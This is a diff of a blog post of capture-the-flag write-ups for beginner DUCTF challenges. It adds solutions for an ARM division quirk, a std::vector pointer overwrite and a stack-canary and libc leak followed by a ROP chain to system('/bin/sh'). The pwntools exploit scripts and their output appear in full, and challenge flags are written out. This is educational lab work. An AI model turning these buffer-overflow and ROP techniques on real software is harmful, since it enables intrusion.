@@ -5,7 +5,7 @@ day: 30
 ---
 # Baby joseph writeups
 
-This post contains all of my writeups for Joseph's baby-difficulty challenges. See [The Joseph Challenge](/blog/the-joseph-challenge) for more information.
+This post contains my writeups for all of Joseph's baby-difficulty challenges. See [The Joseph Challenge](/blog/the-joseph-challenge) for more information.
 
 ## Overview
 
@@ -56,7 +56,7 @@ The thing that messed me up was that punctuation was being included in the index
 
 Flag: `DUCTF{crypto_is_fun_kjqlptzy}`
 
-## no-strings
+## no strings
 
 We're given a binary, and this is a reverse engineering challenge, so I first `strings`'d the binary, and then found nothing so I opened up the binary in Binary Ninja.
 
@@ -170,7 +170,7 @@ Flag: `DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}`
 
 We get a binary along with the assembly source code that the binary was produced from. I've included an annotated version of the assembly program below. I just happened to remember the syscall numbers that this program uses, but [syscall.sh](https://x64.syscall.sh/) is a great resource if you ever need to get information about Linux syscalls.
 
-```asm
+```x86asm
 SECTION .data
 c db 0xc4, 0xda, 0xc5, 0xdb, 0xce, 0x80, 0xf8, 0x3e, 0x82, 0xe8, 0xf7, 0x82, 0xef, 0xc0, 0xf3, 0x86, 0x89, 0xf0, 0xc7, 0xf9, 0xf7, 0x92, 0xca, 0x8c, 0xfb, 0xfc, 0xff, 0x89, 0xff, 0x93, 0xd1, 0xd7, 0x84, 0x80, 0x87, 0x9a, 0x9b, 0xd8, 0x97, 0x89, 0x94, 0xa6, 0x89, 0x9d, 0xdd, 0x94, 0x9a, 0xa7, 0xf3, 0xb2
 
@@ -650,7 +650,7 @@ First I set a breakpoint just before the `read` to check out the layout of the s
 
 Once I had seen the layout of the stack, I set a breakpoint at the end of main just before it started doing the function return dance;
 
-```asm
+```x86asm
     0x5664028e <+96>:    mov    eax,0x0
  => 0x56640293 <+101>:   lea    esp,[ebp-0x8]
     0x56640296 <+104>:   pop    ecx
@@ -749,3 +749,271 @@ print(p.recvall().strip().decode())
 This challenge took around 10 minutes.
 
 Flag: `DUCTF{typ3_c0nfus1on_c4n_b3_c0nfus1ng!}`
+
+## number mashing
+
+For this challenge we only receive an ARM binary. I'm on Apple Silicon and I can natively run the challenge in a docker container. So I created a Dockerfile to do so;
+
+```
+FROM ubuntu:22.04
+
+WORKDIR /app
+COPY number-mashing /app
+COPY flag.txt /app
+CMD ["./number-mashing"]
+```
+
+```sh
+docker build -t number_mashing .
+docker run -it number_mashing /bin/bash
+```
+
+If we run the program it asks us to "give it some numbers".
+
+The next logical step is to open the program in Binary Ninja to see what it's actually doing. Some quick manual reverse engineering gets us the following insights;
+
+- The program accepts two 32 bit integers separated by spaces as input
+- The first number must not be 0
+- The second number must not be 0 or 1
+- We get the flag if `num1 s/ num2 == num1` (where `s/` is signed integer division)
+
+I figured that there must be some funny ARM edgecase that leads to this mathematically impossible (when interpreted over the integers) set up being satisfiable.
+
+A quick search for "arm signed division quirk" brought me to [some documentation for the ARM sdiv instruction](https://mikhailarkhipov.github.io/ARM-doc/A32/sdiv.html). Of particular interest to us, the documentation discusses an edge case related to overflow;
+
+> If the signed integer division 0x80000000 / 0xFFFFFFFF is performed, the pseudocode produces the intermediate integer result 2^31, that overflows the 32-bit signed integer range. No indication of this overflow case is produced, and the 32-bit result written to <Rd> must be the bottom 32 bits of the binary representation of 2^31. So the result of the division is 0x80000000.
+
+This differs from the equivalent x86 [idiv](https://www.felixcloutier.com/x86/idiv) instruction which triggers a 'divide error' exception on overflow.
+
+Luckily for us, the ARM documentation gives us the exact numbers that trigger this edge case, and confirms that the given inputs will satisfy `num1 s/ num2 == num1`.
+
+```
+root@e06a3c3c2c8a:/app# ./number-mashing
+Give me some numbers: 2147483648 4294967295
+Correct! DUCTF{w0w_y0u_just_br0ke_math!!}
+```
+
+This was a nice beginner challenge, and it taught me something new! It probably took like 10 minutes all up if I include setting up the custom Dockerfile.
+
+Flag: `DUCTF{w0w_y0u_just_br0ke_math!!}`
+
+## vector overflow
+
+We get a compiled binary along with its source code which I've included here (compressed for blog viewing);
+
+```cpp
+#include <cstdlib>
+#include <iostream>
+#include <string>
+#include <vector>
+
+char buf[16];
+std::vector<char> v = {'X', 'X', 'X', 'X', 'X'};
+
+void lose() { puts("Bye!"); exit(1); }
+void win() { system("/bin/sh"); exit(0); }
+
+int main() {
+    char ductf[6] = "DUCTF";
+    char* d = ductf;
+
+    std::cin >> buf;
+    if(v.size() == 5) {
+        for(auto &c : v) {
+            if(c != *d++) {
+                lose();
+            }
+        }
+        win();
+    }
+    lose();
+}
+```
+
+`std::cin >> buf` is basically equivalent to `gets` and gives us a trivial buffer overflow. Our goal is to end up with `v` containing the string `DUCTF` after our input, and `buf` sits directly before `v` in memory (I never actually verified that statically but I figured that if my first exploit attempt failed then I'd double check if there was any padding).
+
+Clearly we want to rewrite `v` in some way. To do so in a way that achieves our goal, we'll have to know how a `std::vector` gets laid out in memory. With a quick search I found [a blog post that documents the memory layout of std::vector](http://www.max-sperling.bplaced.net/?p=4983). A `std::vector` is made up of three pointers, a pointer to the start of the vector, a pointer to the end of the vector, and a pointer to the end of the vector's allocation (which might include reserved but unused space).
+
+To change the content of `v`, we'll have to rewrite these pointers so that they point to memory containing the text `DUCTF`. Luckily for us, the program was compiled without PIE, so the addresses of global symbols (such as `buf` and `v`) are fixed.
+
+We can write the text `DUCTF` to `buf`, followed by some padding to reach the beginning of `v`, and then write a pointer to `buf`, and two pointers to `buf + 5` (the end of our `DUCTF` string).
+
+```py
+from pwn import process, p64, ELF
+
+bin = ELF("./vector_overflow")
+buf_addr = bin.symbols["buf"]
+p = process("./vector_overflow")
+s = b"DUCTF"
+start = buf_addr
+end = buf_addr + len(s)
+p.sendline(s + b"A" * (16 - len(s)) + p64(start) + p64(end) + p64(end))
+
+p.sendline(b"cat flag.txt")
+p.sendline(b"exit")
+print(p.recvall().decode())
+```
+
+```
+$ python3 solve.py
+[*] '/share/the-joseph-challenge/baby/vector-overflow/vector_overflow'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+[+] Starting local process './vector_overflow': pid 12408
+[+] Receiving all data: Done (36B)
+[*] Process './vector_overflow' stopped with exit code -6 (SIGABRT) (pid 12408)
+DUCTF{y0u_pwn3d_th4t_vect0r!!}
+free(): invalid pointer  
+```
+
+Flag: `DUCTF{y0u_pwn3d_th4t_vect0r!!}`
+
+## yawa
+
+We're given a simple program with a generic menu loop and a basic 0x30 byte buffer overflow;
+
+```c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void init() {
+    setvbuf(stdin, 0, 2, 0);
+    setvbuf(stdout, 0, 2, 0);
+}
+
+int menu() {
+    int choice;
+    puts("1. Tell me your name");
+    puts("2. Get a personalised greeting");
+    printf("> ");
+    scanf("%d", &choice);
+    return choice;
+}
+
+int main() {
+    init();
+
+    char name[88];
+    int choice;
+
+    while(1) {
+        choice = menu();
+        if(choice == 1) {
+            read(0, name, 0x88);
+        } else if(choice == 2) {
+            printf("Hello, %s\n", name);
+        } else {
+            break;
+        }
+    }
+}
+```
+
+By running checksec on the provided binary, we can see that all of the modern protections have been enabled.
+
+```
+$ checksec yawa
+[!] Could not populate PLT: Cannot allocate 1GB memory to run Unicorn Engine
+[*] '/Users/stackotter/Desktop/Projects/Hacking/the-joseph-challenge/baby/yawa/yawa'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    RUNPATH:    b'.'
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No  
+```
+
+We'll clearly need a way to leak memory to leak the canary and a program or libc address in order to be able to solve this challenge.
+
+If we overflow the name buffer and one more byte, then we'll overwrite the least-significant byte of the stack canary (which is located immediately after the name buffer in this case). That least-significant byte is always a null byte, to make it harder to leak the canary with certain types of buffer overflows and leaks. By overwriting that null byte and leaving the canary intact, we ensure that the canary will get printed when we next request a personalised greeting.
+
+> [!NOTE]
+> When a program uses `read`, it will stop short of the requested count if it reaches a newline, or if it receives partial data and no more data is immediately available. Because of that second stop condition, we can send input without a newline by using `p.send` (instead of the usual `p.sendline`).
+
+Once we've leaked the canary, we're free to overwrite it, so now we can apply the same leak technique except targetting the saved return address instead of the canary. This gives us an address in `libc_start_main` (in particular, the address of the instruction immediately following `libc_start_main`'s call to the program's actual main function). This address will have a constant offset from the base of `libc`. We can pause our exploit script using `pause()` (from pwntools) just after obtaining (and logging) our libc leak, and then attach to our target process with `gdb` to get the base address of libc;
+
+```sh
+$ gdb -p $(pidof ./yawa)
+(gdb) info proc mappings
+...
+```
+
+Once we have the base address of libc, we can compute the constant offset of our leak, which allows us to convert our leak to a libc base address.
+
+Now that we have the libc base address and a stack canary, we can perform a simple ROP chain to call `system("/bin/sh")`.
+
+```py
+from pwn import process, u64, ELF, ROP, context, p64, pause
+
+context.clear(arch="x86_64")
+
+libc = ELF("./libc.so.6")
+start_main_ret_offset = 0x29d90  # obtained dynamically in gdb
+
+p = process("./yawa_patched")
+
+def choose(x: int):
+    p.sendlineafter(b"> ", str(x).encode())
+
+def leak():
+    choose(2)
+    return p.recvline().strip().split(b", ")[1]
+
+n = 88
+choose(1)
+p.send(b"A" * (n + 1))
+canary_leak = b"\x00" + leak()[n + 1:n + 8]
+canary = u64(canary_leak)
+print(f"{hex(canary) = }")
+
+choose(1)
+p.send(b"A" * (n + 16))
+libc_leak = u64(leak()[n + 16:].ljust(8, b"\x00"))
+libc.address = libc_leak - start_main_ret_offset
+
+system = libc.symbols["system"]
+binsh = next(libc.search(b"/bin/sh\x00"))
+print(f"{hex(system) = }")
+print(f"{hex(binsh) = }")
+
+rop = ROP(libc)
+rop.call(rop.ret)  # align the stack to avoid movaps segfault inside system
+rop.call(system, [binsh])
+
+choose(1)
+p.send(b"A" * 88 + p64(canary) + b"B" * 8 + rop.chain())
+choose(3)  # exit while loop
+
+p.sendline(b"cat flag.txt")
+p.sendline(b"exit")
+print(p.recvall().decode())
+```
+
+```
+$ python3 solve.py
+[+] Starting local process './yawa_patched': pid 12807
+hex(canary) = '0xb8d4ac1bf38f4700'
+hex(system) = '0x7fcbd4850d70'
+hex(binsh) = '0x7fcbd49d8678'
+[*] Process './yawa_patched' stopped with exit code -11 (SIGSEGV) (pid 12807)
+DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}
+```
+
+Flag: `DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}`
+
+## Conclusion
+
+Even though many of these challenges were very easy (as you'd expect from the advertised difficulty), I still found myself learning little tidbits from many of the challenges, and solidifying existing skills.
+
+I'm looking forward to moving on to some of Joseph's harder challenges!
